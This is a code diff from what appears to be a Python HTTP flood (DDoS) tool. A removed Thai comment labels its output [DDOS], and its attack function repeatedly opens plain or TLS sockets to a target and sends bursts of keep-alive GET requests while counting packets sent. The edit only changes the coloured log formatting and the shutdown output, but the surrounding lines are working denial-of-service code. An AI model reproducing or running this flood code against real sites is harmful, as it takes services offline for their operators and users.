@@ -80,8 +80,8 @@ def attack(mode):
                 if use_ssl: s = ssl.create_default_context().wrap_socket(s, server_hostname=target)
                 s.connect((target, port))
             
-            # เปลี่ยนตัวย่อเป็น [DDOS] ตามความต้องการล่าสุด
-            log_msg = f"{Y}[DDOS]{RESET}{R}({now}){RESET}{M}>>{RESET}{D}{sent_count:06d}{RESET}{M}|{RESET}{M}->{C}{target}{path}{RESET}{M}|{G}OK{RESET}\n"
+            # --- ปรับ URL Domain เป็นเหลือง, Path เป็นเทาเข้ม และ OK เป็นเหลือง ---
+            log_msg = f"{Y}>>{RESET} {R}({now}){RESET} {M}|{RESET} {R}{sent_count:06d}{RESET} {M}|{RESET} {R}->{RESET} {Y}{target}{RESET}{D}{path}{RESET} {M}|{RESET} {Y}OK{RESET}\n"
 
             req = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\n\r\n"
             for _ in range(15):
@@ -89,10 +89,12 @@ def attack(mode):
                 s.send(req.encode('ascii'))
                 with count_lock:
                     sent_count += 1
-                    sys.stdout.write(log_msg)
+                    if not stop_event.is_set():
+                        sys.stdout.write(log_msg)
             s.close()
         except:
-            sys.stdout.write(f"{Y}[DDOS]{RESET}{R}({time.strftime('%H:%M')}){RESET}{R}!!{RESET}\n")
+            if not stop_event.is_set():
+                sys.stdout.write(f"{Y}>>{RESET} {R}({time.strftime('%H:%M')}){RESET} {R}!!{RESET}\n")
             time.sleep(0.1)
 
 print(f"{D} ----------------------------------- {RESET}")
@@ -104,7 +106,9 @@ except KeyboardInterrupt:
     stop_event.set()
     duration = round(time.time() - start_time, 2)
     avg_speed = round(sent_count / duration, 2) if duration > 0 else 0
-    print(f"\n\n{D}-----------------------------------{RESET}")
+    
+    print(f"\r{RESET}")
+    print(f"{D}-----------------------------------{RESET}")
     print(f"{R}[!] SESSION TERMINATED{RESET}")
     print(f"{W}TOTAL PACKETS SENT : {G}{sent_count}{RESET}")
     print(f"{W}TOTAL DURATION     : {C}{duration}s{RESET}")
